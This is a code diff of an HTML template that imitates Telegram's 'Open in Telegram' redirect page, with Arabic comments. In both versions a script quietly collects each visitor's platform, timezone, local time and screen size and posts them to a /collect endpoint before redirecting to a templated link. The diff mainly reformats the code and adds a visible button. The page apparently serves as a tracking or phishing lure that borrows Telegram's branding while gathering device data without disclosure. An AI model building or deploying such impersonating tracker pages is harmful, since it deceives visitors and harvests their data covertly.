@@ -3,55 +3,60 @@
 <head>
   <meta charset="UTF-8" />
   <title>Telegram</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="theme-color" content="#0088cc">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="theme-color" content="#0088cc" />
   <link rel="stylesheet" href="/static/style.css" />
   <link rel="icon" href="https://telegram.org/favicon.ico" />
 </head>
 <body>
   <div class="page">
     <div class="telegram-box">
-      <img src="https://telegram.org/img/t_logo.png" class="telegram-logo" alt="Telegram Logo" />
+      <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" class="telegram-logo" />
       <h1 class="title">Open Telegram?</h1>
       <p class="subtitle">This link will open in Telegram.</p>
-      <a id="openButton" class="open-button" href="#">Open in Telegram</a>
-      <p class="waiting">Redirecting... please wait</p>
+      
+      <!-- الزر مع الرابط ثابت -->
+      <a
+        id="openButton"
+        href="{{ goto }}"
+        target="_blank"
+        rel="noopener noreferrer"
+        class="open-button"
+      >
+        Open in Telegram
+      </a>
+
+      <p class="waiting">Redirecting... If nothing happens, please tap the button above.</p>
     </div>
   </div>
-<script>
-  const goto = "{{ goto }}";
 
-  // إرسال البيانات إلى /collect
-  async function sendVisitorData() {
-    try {
-      const data = {
-        platform: navigator.platform,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        localTime: new Date().toString(),
-        screen: `${screen.width}x${screen.height}`
-      };
+  <script>
+    async function sendVisitorData() {
+      try {
+        const data = {
+          platform: navigator.platform,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          localTime: new Date().toString(),
+          screen: `${screen.width}x${screen.height}`,
+        };
 
-      await fetch("/collect", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify(data)
-      });
-    } catch (e) {
-      console.error("Data collection failed:", e);
+        await fetch('/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data),
+        });
+      } catch (e) {
+        console.error('Data collection failed:', e);
+      }
     }
-  }
 
-  // إرسال البيانات ثم التحويل
-  sendVisitorData().then(() => {
-    setTimeout(() => {
-      window.location.href = goto;
-    }, 2400);
-  });
-</script>
-
-  
+    sendVisitorData().then(() => {
+      setTimeout(() => {
+        // تحويل تلقائي بعد 2.4 ثانية (2400 ملي ثانية)
+        window.location.href = "{{ goto }}";
+      }, 2400);
+    });
+  </script>
 </body>
 </html>
- 
+
